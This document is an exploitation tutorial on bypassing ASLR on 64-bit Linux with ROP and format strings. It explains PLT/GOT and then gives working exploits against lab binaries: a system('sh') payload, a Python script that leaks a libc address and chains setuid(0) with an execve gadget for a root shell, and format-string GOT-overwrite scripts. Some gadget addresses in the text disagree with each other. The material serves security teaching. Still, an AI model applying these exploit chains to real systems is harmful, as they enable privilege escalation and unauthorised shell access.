# 64 bit ROP With ASLR

sources:
https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html \
https://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-en-41595384 \
https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf \
https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems.pdf \
https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html \
http://shell-storm.org/talks/ROP_course_lecture_jonathan_salwan_2014.pdf \
https://exploit.courses/files/bfh2019/day5/0x53_ExploitMitigations_PIE.pdf \
https://ironhackers.es/en/tutoriales/pwn-rop-bypass-nx-aslr-pie-y-canary/ \
https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html \
https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html \
http://blog.k3170makan.com/2018/11/introduction-to-elf-format-part-vii.html \
http://inaz2.hatenablog.com/entry/2014/10/12/191047 \
https://dangokyo.me/2018/01/27/extra-exploitation-technique-return-to-dl_resolve/ \
https://cs155.stanford.edu/papers/formatstring-1.2.pdf \
https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=20
https://nebelwelt.net/files/11CCC.pdf \

Until now, we exploited without ASLR. Everytime
we got the address for a gadget or function in our
program or a loaded library, we knew it would be the
same when we launched our program again.

With ASLR, the addresses are randomized everytime
the program is run (hence the name Address Space
Layout Randomization). This means that even though
we got an address for a gadget or function under `gdb`,
that doesn't mean it will have the same address outside
`gdb`, or even in `gdb` again!

However, to randomize the address of a library or executable,
they need to have been compiled to position independent code. `libc`
does this, but sometimes executables do not (they use the `-no-pie`
flag).

To summarize: ASLR randomize the stack, the heap, libraries with
position independent code and the executable image if it also has
position independent code.

## Key Concepts

### PIE and PLT

#### PIE

`PIE` means Position Independet Executable. This
option is enabled by default and can be deactivated
with the `-no-pie` compilation flag.

What `PIE` does is produce code refer to resources
and addresses using a offset or other techniques. This
way the code can be placed anywhere in memory, since it
doesn't assume a fixed address for anything.

By using `-no-pie`, all the address in the executable
itself are always the same between executions, but with
ASLR, libc and other libraries are loaded to random addresses.

We will try to make a exploit only from what we can find in the
executable.

#### PLT

In the above explanation for `PIE`, we said that it
uses "offset or other techniques". One of these
"other techniques" is `PLT`.

`PLT` (Procedure Linkage Table) is a section always present
in the executable. What it does is create "stub" functions
for library functions.

These "stub" function are what we see in `gdb` and
`objdump` as `system@plt` or `printf@plt`. When we call
`<function>@plt` we aren't calling `<function>`, we are
jumping to the PLT section and from there being redirected
to the function.

##### PLT Under The Hood

If you launch `gdb rip` and catch a break at main, you 
can use `ni` to go to a `call <function>@plt` instruction
and use `si` to go inside it, to see how it is performed
at a lower level.

You should jump to three lines of instructions that look
like these:

```
Dump of assembler code for function puts@plt:
=> 0x00000000004004b0 <+0>:	jmp    QWORD PTR [rip+0x200b6a]        # 0x601020
   0x00000000004004b6 <+6>:	push   0x1
   0x00000000004004bb <+11>:	jmp    0x400490

```

This code is inside the `PLT` section. We can see that the
first instruction is a jump to the address stored at `rip+0x200b6a`.

Whatever address there is at `rip+0x200b6a`, it is the one we will
execute next. `rip+0x200b6a` or whatever address it happens to be
always belongs to the `GOT` section (Global Offset Table).

Obs.: Actually it is the `.got.plt` section, but you can ignore
that for now.

When we first call `<function>@plt`, the address we jump to is
actually the `push` instruction you see right below the first
`jmp` instruction:

```
   0x00000000004004b6 <+6>:	push   0x1
```

Why are we pushing a `0x1`? Every function called with the `PLT`
is associated with a number, in this case `puts@plt` is associated
with `0x1`.

After that, we jump to `0x400490`:

```
   0x00000000004004bb <+11>:	jmp    0x400490
```

And this doesn't take us to `puts`, why? Because we don't know
where `puts` is yet! This will execute some linker code that will
load the address of `puts` to the `GOT`.

Where exactly in the `GOT`? `rip+0x200b6a`. This way, next time
we call `puts@plt`, we will jump directly to the actual `puts`
function.

In short, the `PLT` is used to find and call
library functions that are randomly loaded somewhere.

## Plan of Attack

There are mainly two ways to defeat ASLR:

1. use anti ASLR resources (like executables addresses if using `-no-pie`)

2. get pointer leak (to find relevant addresses during execution)

It is tough to make a generalized attack that can work in multiple
situations, so we will take for granted some aspects about the
executable when necessary. 

We also are going to use the `-no-pie` flag for the programs. Next
module, where we also see how to defeat the stack canary, we will be
using `PIE`.

For now, the exploits depend on the `-no-pie` configuration.

The exploits are divided as:

* Stream of bytes as input:

	* using `rip.c`:

		* [No PIE, No Libc, No Problem](#no-pie-no-libc-no-problem)

		* [Leaking Our Way To Libc](#leaking-our-way-to-libc)

* String as input:

	* using `rip_str.c`:

		* [ROP Without Overflow? Introduction to String Oriented Programming](#rop-without-overflow-introduction-to-string-oriented-programming)

## No PIE, No Libc, No Problem

Using the `PLT` we can easily return to any function used in a
`-no-pie` compiled executable. Let's try calling `system@plt`
with "/bin/sh" as argument.

For that we will need to find:

* `system@plt`

* "/bin/sh"

* `pop rdi; ret`

### `system@plt`

To get the `system@plt` address, one easy way of doing it is
with `objdump -M intel -D rip | grep system@plt`:

```
0000000000400580 <system@plt>:
  4006c1:	e8 ba fe ff ff       	call   400580 <system@plt>
```

Now we know the `system@plt` address is `0x400580`.

### "/bin/sh"

Now we need to find a "/bin/sh" string in the executable. We can
easily check the constant strings in the executable with
`readelf -p .rodata rip` and filter our results with `grep`. By using
`readelf -p .rodata rip | grep "/bin/sh" we get`:

```
```

Well... nothing. But we can also try just "sh", since "/bin/sh"
is usually also in the PATH. `readelf -p .rodata rip | grep sh`
returns:

```
  [    35]  secret_hash
  [    58]  i don't feel like giving you a shell though
```

The second result doesn't work. We would be invoking
`shell though`, which doesn't really do anything.

The first result though, can be used! To get the exact address of
the `sh` substring, we just need to add `0x35` + `0x9` = `0x3e`
(offset of `secret_hash` to the beginning of the `rodata` section
and offset of `sh` substring to the beginning of `secret_hash`).

Now we just need to add `0x3e` to the offset of the `rodata` section
from the beginning of the executable, which we can get with 
`readelf --sections rip | grep rodata`:

```
  [15] .rodata           PROGBITS         0000000000400830  00000830
```

`0x400830` + `0x3e` = `0x40086e`

### `pop rdi`

At this point, we already this over and over. Just use `objdump` and
`grep` to get the gadget. If i use
`objdump -D -M intel rip | grep -A 1 "pop.*rdi" | grep -B 1 ret` i get:

```
```

Well... nothing. Looks like this will be more complicated.

Let's take a closer look at the output from
`objdump -M intel -D rip | grep pop`:

```
400292:	5f                   	pop    rdi
4003ee:	5f                   	pop    rdi
4003fa:	5f                   	pop    rdi
400400:	5f                   	pop    rdi
400401:	5f                   	pop    rdi
400407:	43 5f                	rex.XB pop r15
400440:	5b                   	pop    rbx
4005c5:	5e                   	pop    rsi
40060f:	5d                   	pop    rbp
400620:	5d                   	pop    rbp
40065d:	5d                   	pop    rbp
400668:	5d                   	pop    rbp
400682:	5d                   	pop    rbp
4006b0:	5d                   	pop    rbp
4006c7:	5d                   	pop    rbp
40080a:	5b                   	pop    rbx
40080b:	5d                   	pop    rbp
40080c:	41 5c                	pop    r12
40080e:	41 5d                	pop    r13
400810:	41 5e                	pop    r14
400812:	41 5f                	pop    r15
```

We can see in the middle column the opcodes for the commands.
The gadget that is relevant to us `pop rdi` has the opcode
`5f`, so let's try finding gadgets with the opcode `5f`
with `objdump -D -M intel rip | grep -A 1 5f | grep -B 1 ret`:

```
  400812:	41 5f                	pop    r15
  400814:	c3                   	ret  
```

At first glance, that is not the gadget we are looking for,
but in reality the gadget we want really is just `5f` followed
by `c3` (pop rdi; ret). So we can just use `0x4007b3` to get the
`5f c3` sequence.

### Putting It All Together

Our payload should look like this:

```
fill buufer + pop rdi; ret + "sh" + system@plt
```

Putting it all in a one-liner give us:

```
(python3 -c "__import__('sys').stdout.buffer.write(b'A' * 0x80 + b'BBBBBBBB' + b'\xb3\x07\x40\x00\x00\x00\x00\x00' + b'\x0e\x08\x40\x00\x00\x00\x00\x00' + b'\x40\x05\x40\x00\x00\x00\x00\x00')"; cat ) | ./rip
```

## Leaking Our Way To Libc

In the [previous](#no-pie-no-libc-no-problem) section we
managed to get a shell only using resources from the 
executable. However, there was no way to get root with
only that.

To do so, we need to defeat ASLR and be able to use
libc functions again, to call functions like
`setuid` and `execve`.

How we do it? Two words: Information Disclosure.

We need to find a vulnerability in the program that
let us get addresses from `libc`, from that we can get
the libc version (if we didn't have that info already) and
the offset for any function on it.

As we saw before in the [key concepts](#key-concepts) section,
the address of dynamic linked functions are kept in the `GOT`
after they are called for the first time.

In this section we will:

* [Leak Pointers From Libc](#leaking-pointers-from-libc) (with `gdb`)

* [Ret2Vuln](#return-to-vuln) (execute vulnerable function more than once)

* [Make a Rop Chain With Leaked Info](#make-rop-chain-with-leaked-info)

### Leaking Pointers From Libc (With `gdb`)

Since for now we only know the addresses of resources in the
executable, let's use them for leaking the info.

We can use `printf` to print information from addresses
relative to the stack.

#### Format Strings

You may know we can use "%d" to print integers and "%s" to
print strings, but we can also use "%5$d" to print the
fifth argument given to printf (aside from the format
stirng itself) as a integer.

The System V ABI says that the first pointer or integer
arguments to a function must be given through
`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`. If more than
6 arguments of this type are given, they must be given
through the stack.

In other words, we can use "6$" (or "7$" and so on) in
the format string to print a value from the stack.

#### Leaking Libc Pointers

Let's launch `gdb rip`. As an input we will use
`%p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p`.

Check if any of the addresses in the output belong to
`libc`. You can check the range of addresses belonging to
`libc` with `info proc map`.

obs.: You can them print only this address using the
"%\<n\>$p" trick. Try it out!

Use `x/i <address you leaked>` to see what function it
belongs to, for example, i got:

```
(gdb) x/i 0x7fdc235802e1
   0x7fdc235802e1 <__libc_start_main+241>:	mov    edi,eax
```

Now i need to subtract `241` fromt the address to get
the `__libc_start_main`.

Then, subtract the `libc` base address (found with `info proc map`)
from the address i got, to know `__libc_start_main` offset from the
beginning of the `libc` library address.

No matter where ASLR loads `libc`, the offsets are always the
same. So using them, we could get the `libc` version using tools
like [libc.blukat.me](https://libc.blukat.me) or
[libc-database](https://github.com/niklasb/libc-database).

Why know the version? Because we can get interesting offsets from it!
Like the `setuid` function address of the [`execve` gadget that give us
a shell](../second/second.md/#one-gadget-to-rule-them-all).

I got that for my version of `libc`, `__libc_start_main` is at offset
`0x201f0`.

#### Using Leaked Pointers

Since the offset from `__libc_start_main+241` is always the same, we can
calculate the `libc` base address once we know the address of
`__libc_start_main+241`.

If we know the base address and the version, we know the address of every
single function in `libc`!

There is only one problem: We only get to input once. Once we leak the
address, the program prints some stuff and quits. We need to change that!

### Return to Vuln

To solve this issue, we will execute the vulnerable function,
`password_is_correct`, more than once.

We just need to overwrite the return address of the `password_is_correct`
with its own initial address.

#### Get Vuln Address

With `objdump -M intel -D rip | grep "<password_is_correct>:"`, get the
address of `password_is_correct`:

```
00000000004006c9 <password_is_correct>:
```

#### Overwrite RIP

Just overwrite RIP like we did many times before. Our payload should look
something like this:

```
fill buffer (0x80 bytes) + overwrite RBP (0x8 bytes) + overwrite RIP (0x8 bytes)
```

### Make ROP Chain With Leaked Info

The idea is to make the following rop chain:

```
pop rdi; ret + 0 + setuid + execve gadget
```

We can get the `pop rdi; ret` gadget from the executable itself, just like did
in the [previous](#no-pie-no-libc-no-problem) section.

What is left is the `setuid` and `execve` gadget addresses.

### Getting The Offsets

In the end, we wll have a script that reads the leaked address and calculate the
relevant addresses based on it.

For that, we need to know the offset of the code we want to use.

We need to find the offset of the `execve` gadget we used in the
[previous](../second/second.md/#one-gadget-to-rule-them-all) module and the
`setuid`.

With the same version of `libc` that our victim program is using, we will use
`objdump -M intel libc.so | grep -B 5 execve | grep -C 3 </bin/sh offset in this version of libc>`

This should give you an output like:

```
   b8c07:	48 89 ca             	mov    rdx,rcx
   b8c0a:	e8 81 b2 fc ff       	call   83e90 <memcpy@GLIBC_2.2.5>
   b8c0f:	48 8d 3d 03 90 0a 00 	lea    rdi,[rip+0xa9003]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
   b8c16:	4c 89 e2             	mov    rdx,r12
   b8c19:	4c 89 ee             	mov    rsi,r13
   b8c1c:	e8 1f fa ff ff       	call   b8640 <execve@@GLIBC_2.2.5>
--
   d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
   d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
   d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
   d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
   d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
   d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
```

I will use the `0xd6b9f` offset to call it. In the script, all we gotta do is
add the `libc` base address ot the  offset.

To get the `setuid`, use `objdump -M intel -D rip | grep setuid`:

```
00000000000b8fa0 <setuid@@GLIBC_2.2.5>:
   b8fa8:	75 2e                	jne    b8fd8 <setuid@@GLIBC_2.2.5+0x38>
   b8fb9:	77 05                	ja     b8fc0 <setuid@@GLIBC_2.2.5+0x20>
```

And we got the offset: `0xb8fa0`.

All we need to do now is put it all together in a script.

### Putting In All Together

I decided to run the victim program in a server with `netcat`. To get the server
running you just need to do `sudo busybox nc -llp 65000 -e "./rip"` (sudo is only
necessary if you want to get a root shell).

obs.: be aware that sometimes there are more than one version of `netcat` in the system.
My system comes with `busybox netcat`, `netcat.openbsd` and `netcat.traditional`. Check the
`--help` option in the one you are using to figure out its options.

obs2.: be aware that some `netcat` version don't spawn persistent servers (if you stop talking
to the server it doesn't close).

The exploit itself uses `telnetlib` to send and receive data and hand the control of the connection
directly to us once we get a shell:

obs.: We use telnet only at the end because it doubles the `0xff` byte when sending and removes one
when receiving.

```
import struct
from telnetlib import Telnet
import socket

pack = lambda x: struct.pack("Q", x)

def leaker_payload():

    leak_payload = b'%27$p' # leak __libc_start_main+241
    leak_payload += b'A' * (0x80 - len(leak_payload)) # fill buffer
    leak_payload += b'BBBBBBBB' # rbp
    leak_payload += pack(0x4006c9) # return to vuln (password_is_correct)

    return leak_payload

def get_libc_base(__libc_start_main_241):

    __libc_start_main_241 = int(__libc_start_main_241, 16)
    libc_base = __libc_start_main_241 - 241 - 0x201f0

    return libc_base

def root_shell(libc_base):

    libc_base = int(libc_base)
    execve = pack(libc_base + 0xd6b9f) # execve offset
    setuid = pack(libc_base + 0xb8fa0) # setuid offset
    pop_rdi = pack(0x400813) # pop rdi, from the executable

    return b'A' * 0x80 + b'BBBBBBBB' + pop_rdi + pack(0) + setuid + execve

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

skt.connect(('localhost', 65000))

server = Telnet()
server.sock = skt

server.read_until(b'insert the password: ')

print("[!] sending leak payload")
server.write(leaker_payload())

leakage = server.read_until(b'\n')

libc_base = get_libc_base(str(leakage).split('your input: 0x')[1].split('AAAAA')[0])

print("[+] libc base address: ", hex(libc_base))

print("[!] sending root payload")
server.write(root_shell(libc_base))
server.interact()

server.close()
```

## ROP Without Overflow? Introduction To String Oriented Programming

What is String Oriented Programming? To find out take a look at `rip_str.c`:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {

	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);

	printf("#### Dialog Maker 2000 ####\n");

	printf("me: Is there something you want to tell me?\n");

	char msg[128];

	read(0, msg, sizeof(msg));

	printf("you:");  printf(msg); printf("\n");

	printf("me: okay, cool, i got it.\n");

	exit(0);
}
```

Pretty air-tight, right? No buffer overflows in sight and even if there
were, the function doesn't return, since `exit` is called instead.

However, there is a format string vulnerabilty, so let's exploit it.

### The Plan

While ROP uses the return address, SOP uses format strings exploits
to leak and write memory.

We already saw how to leak memory using the "%p" format, but we can
also write to an address using "%n", which write the number of bytes
printed by the current `printf` call.

So, using "%<number>$n" we can write to an address and using
"%<number>$p" we can read from an address relative to the stack.

Furthermore, we can give the address we want to write to in our 
input, and point to it with "%n".

The plan is to leak relevant `libc` pointers and then ret2libc. We need 2
stages: one for leaking the pointers and another for using them. Again, we
will to a Ret2Vuln.

Our to-do list is:

* [Setup Ret2Vuln](#setup-ret-vuln)

* [Leak Libc Pointers, SOP Style](#use-libc-pointers-sop-style)

* use `libc` pointers

### Setup Ret2Vuln

This Ret2Vuln will be different from the ones in other sections. Since we
can't return to another function, we will overwrite the `GOT` so that a
function  always call the vulnerable one.

In `rip_str.c`, we can see that `exit` is called at the end of the function.
The plan is to overwrite the `GOT` entry for `exit`, so `main` will be
called instead of the runtime resolver or any other function.

#### Reading GOT Entry

Since we write with "%n" in SOP, we need the point "%n" to somewhere with the
address of the `GOT` entry. Guess what? That is what `exit@plt` does! If we
do `objdump -D -M intel rip_str | grep -A 5 "<exit@plt>:"` we can see:

```
00000000004005e0 <exit@plt>:
  4005e0:	ff 25 5a 0a 20 00    	jmp    QWORD PTR [rip+0x200a5a]        # 601040 <exit@GLIBC_2.2.5>
  4005e6:	68 05 00 00 00       	push   0x5
  4005eb:	e9 90 ff ff ff       	jmp    400580 <.plt>

```

We can see at the right of the "#" that the `GOT` entry address is `0x601040`.

Our first goal is to write the address to stack (without "%n", only the input
itself) and then print it with "%p". One important factor to take into account
is the input length. Always pass input with the same size.

I served `rip_str` with `netcat` using `busybox netcat -llp 65000 -e ./rip_str`
and connected to it using this script:

```
import socket
import struct

from telnetlib import Telnet

def read_until(skt, _bytes):
	recv = b''
	while _bytes not in recv:
		recv += skt.recv(1)
return recv

pack = lambda x: struct.pack("Q", x)

exit_got = pack(0x601040)

leaker_payload = b'%9$p'
leaker_payload += b'A' * ( 24 - len(leaker_payload) )
leaker_payload += exit_got

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
skt.connect(('localhost', 65000))

skt.send(leaker_payload)

print(read_until(skt, b'got it'))
```

Just change the offset being printed and the size of the input given
before the pointer until you can print `exit_got`. In my case `9` did
it.

#### Overwriting GOT Entry

Let's overwrite `exit@plt` `GOT` entry with `_start` (the first function to be
executed, yes, before `main`). With `nm rip_str | grep " _start"`
(`nm` show info about symbols in the file) we can get the address of
`_start`:

```
00000000004005f0 T _start
```

We just need to write `0x4005f0` bytes before calling `%<number>$n`.
Just one problem: `0x4005f0` is a lot of bytes, `4195824` to be
exact. There are some tricks to workaround this:

* Use format string operators to write more bytes

* Write to more than one address

Let's go with the first one. By using "%100c" we will write 100
characters  (bytes). So we can just use:

```
"%4196070c" + "%<number>$n" + padding + exit_got
```

I also added a function to let interact directly with the server and
handle errors:

```
import socket
import struct

from telnetlib import Telnet

def interact(skt):

    telnet = Telnet()
    telnet.sock = skt
    interact_handle_errors(telnet)

def interact_handle_errors(telnet):
    try:
        telnet.interact()

    except UnicodeDecodeError:
        interact_handle_errors(telnet)

def read_until(skt, _bytes):
    recv = b''
    while _bytes not in recv:
        recv += skt.recv(1)
    return recv

pack = lambda x: struct.pack("Q", x)

def get_socket():
    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    skt.connect(('localhost', 65000))
    return skt

def get_ret2vuln_payload():

    exit_got = pack(0x601040)

    ret2vuln_payload = b'%4195824c%9$n'
    ret2vuln_payload += b'A' * ( 24 - len(ret2vuln_payload) )
    ret2vuln_payload += exit_got

    return ret2vuln_payload

if __name__ == "__main__":

    skt = get_socket()

    skt.send(get_ret2vuln_payload())

    interact(skt)
```

If you run it, you can see that the downfall of writing the
necessary number of bytes using the format string specifier
"%4196070c" is the time it takes to print the whole thing.

However, you can also see that `main` keeps getting executed
over and over.

Now let's leak some `libc` pointers!

### Leak Libc Pointers, SOP Style

Just like we did in [Leaking Our Way To Libc](#leaking-our-way-to-libc),
we will open the program in `gdb` to see where the `libc` addresses
appear and to which instruction they belong.

By just printing a bunch of pointers and using `info proc map` to see
where `libc` is, we can easily end up finding an address from `libc`.

obs.: remember to get the offset, not the address itself! ASLR!

In my case "%3$p" was pointing to an `libc` address, which was 7 bytes
in the first instruction from `__write_nocancel`. 

### Libc Version

By searching [libc.blukat.me](https://libc.blukat.me/) i found... nothing!

How is it possible? I got the addresses and offset directly from `libc`!

Answer: `libc` has many symbols, and these programs don't search for
all of them. However, distance between symbols are kept the same between
different executions! So we just need to get the distance from the symbol
we found to more well known (can be any!).

For example, I used `x/<number1>i <address i leaked> - <number2>` to check
symbols close by the one i found. Looks like `__write_nocancel+7` is only
16 bytes above `write`! Using `write` offset i managed to find the `libc`
version online.

At the end of the day, if you can debug a program with `gdb` you can also
just manually print some instructions from `libc` and see what are the 
related symbols.

### Getting Relevant Addresses From Libc

Once you managed to get the `libc` offset, all we gotta do is decide how
our payload will look like. I will go with the `execve` gadget to get a
simple shell. You can find it by running
`objdump -D -M intel <path/to/libc> | grep -B 5 execve | grep -C 3 <offset to /bin/sh>`

### It Is SOP Time

You have the `libc` base address, all the necessary offsets, how do you return
to the desired functions? Answer: With some work. 

We already know we can execute a desired function by overwriting the `GOT`
entry of another, so let's use the same strategy to execute the `execve`
gadget.

We can actually just overwrite exit again and call the gadget instead of
performing `ret2vuln` over and over again.

The problem here is that we can't use the same technique to overwrite `GOT`
since we would need to write an big number of bytes. `libc` addresses are
usually really big, for example `0x7f60e6091000`, which is `140054152941568`
in decimal (around 70027076 times greater than the number of bytes we wrote
before).

#### Overwrite GOT Entry Piece By Piece

The solution is to write to `GOT` piece by piece. For example, to write
`0x7fe616f54b9f` to `exit@got.plt`, we would the first byte (`0x9f`) to
`exit@gt.plt`, the second byte (`0x54`) to `exit@got.plt` + 1 and so on.

##### Specify Stack Positions

From the 6th and beyond, all arguments come from the stack.

If we give "AAAAAAAA%6$%p" we should get `AAAAAAAA0x4141414141414141`.

That is because the first 8 bytes in the stack are 'A's, and where
are printing an address made of the first 8 bytes.

We could keep going:

If we give "AAAAAAAA%6$p....BBBBBBBB%8$p" we should get
`AAAAAAAA0x414141414141414....BBBBBBBB0x4242424242424242`.

##### The Problem With Writing Piece By Piece

We can already write to a specific address in memory (just change
the `p`s in the section above by `n` and makes the 'A's and 'B's
real addresses we want to write to).

But the problem is the values we are going to write. Since the "%n"
operator writes the number of bytes already printed, there is no way we
can write a smaller value than we wrote before.

A way around this is to overflow the byte.

For example, we want to write `0x23`, but it is smaller than the
value wrote before. We just need to write `0x123`, this is a greater
value, but since the added `0x100` bytes are overflowed to the next
byte, we will get rid of it when we write to it next.

In summary, the algorithm here is just to add `0x100` to the 
value if necessary.

##### Final String

To write a single byte, we will have a substring like so:

```
padding (write a bunch of bytes using %<number>c) + %<offset>$n
```

After writing all necessary substrings like the one above, we will
add another padding, so that the stack is aligned, and write the
addresses which the "%n" operators will refer to.
